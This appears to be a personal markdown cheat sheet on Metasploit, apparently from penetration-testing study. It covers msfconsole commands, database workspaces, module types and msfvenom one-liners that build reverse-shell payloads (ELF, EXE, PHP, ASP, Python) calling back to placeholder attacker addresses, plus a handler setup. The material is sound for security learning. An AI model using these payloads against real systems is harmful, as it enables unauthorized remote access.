---
title: "Metasploit"
date: 2022-06-30T14:57:29-05:00
draft: false
category: Networking
tags:
- Network
- Security
- Tools
---

METASPLOIT:
- executable: msfconsole
  - search: find modules
  - use ???: enables the use of module
  - show options: shows required options
  - set OPTION VALUE: sets options to values
  - unset [OPTION|all]: clear option or all options
  - setg/unsetg: set/unset option globally
  - show payloads: show possible payloads to be used
  - info: shows info on module
  - back: exit a used module 
  - exploit/run: execute an exploit
  - background/CTRL+Z: sends command to background session
  - sessions: list sessions
  - sessions -i #: switch to interactive session

- use database:
  - systemctl start postgresql
  - msfdb init
  - msfconsole
  - db_status
  - workspace -a NAME  - adds new workspace NAME
  - workspace NAME     - switches to workspace NAME
  - db_nmap            - runs nmap and saves it to db
    - hosts            - lists hosts info
    - services         - lists services info
  - hosts -R           - sets RHOSTS to host in db

- Modules:
  - Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.
  - Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
  - Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.
  - Exploits: Exploits, neatly organized by target system.
  - NOPs: NOPs (No OPeration) do nothing, literally.
  - Payloads: Payloads are codes that will run on the target system.
    - Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
    - Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. 
               “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some 
               advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
    - Stages: Downloaded by the stager. This will allow you to use larger sized payloads.
  - Post: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

- PortScan
  - search portscan
  - scanner/discovery/udp_sweep

- msfvenom
  - allows you to access all payloads available in the metasploit framework
  - create payloads in different formats (PHP,exe,dll,elf,etc.) for different targets (apple,windows,android,linux,etc.)
  - Linux Executable and Linkable Format (elf)
    - msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
    - The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure 
      they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the 
      chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine 
      command line.
  - Windows
    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
  - PHP
    - msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
  - ASP
    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
  - Python
    - msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
  - EXAMPLE:
    - msf6 > use exploit/multi/handler 
      [*] Using configured payload generic/shell_reverse_tcp
      msf6 exploit(multi/handler) > set payload php/reverse_php
      payload => php/reverse_php
      msf6 exploit(multi/handler) > set lhost 10.0.X.X
      lhost => 10.0.X.X
      msf6 exploit(multi/handler) > set lport XXXX
      lport => XXXX
      msf6 exploit(multi/handler) > run
